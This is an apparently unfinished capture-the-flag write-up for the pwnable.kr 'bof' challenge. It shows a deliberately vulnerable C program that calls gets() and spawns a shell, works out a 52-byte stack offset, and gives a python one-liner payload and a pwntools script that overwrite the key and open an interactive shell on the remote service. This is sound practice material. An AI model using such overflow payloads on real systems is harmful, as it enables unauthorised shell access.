# Description
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?
```
---

This level we're dealing with utilizing a buffer overflow  to get our flag:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
(`readme`: Binary running in port 9000 on localhost)

We need to exploit the `gets` function to override the buffer somehow.
`gets` manpage:
```
Never  use  gets(). Because  it  is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```

Presumably, we want to override the value of `key`.
Using `gdb`, the source key compare is converted to:
`cmp dword ptr [ebp + 8], 0xcafebabe`

`0xffffd4fc` - our value
`0xffffd530` - 0xdeadbeef
Diff: 52 bytes
Meaning we need to pass in 52 characters, and then the desired `0xcafebabe` (x32 is little endian) value:
```
python2 -c "print '\x41'*52 + '\xbe\xba\xfe\xca' + '\n'" > payload
```
But then, trying to use:
```
bof@pwnable.kr >>> nc 0 9000 < payload
// OR
me@my-pc >>> nc pwnable.kr < payload
// or similar...
```
Just wouldn't work... Which is weird because I made it work locally in the same manner.

Let's try to do that with `pwntools`:
```python
from pwn import *  
  
p = remote("pwnable.kr", 9000)  
  
payload = b"A" * 52  
payload += b"\xbe\xba\xfe\xca"  
  
p.sendline(payload)  
  
p.interactive()
```
We receive a `pwnlib.exception.PwnlibException: Could not connect to pwnable.kr on port 9000` (and neither `nc pwnable.kr 9000` worked)...
# Flag
```
// to be pasted
```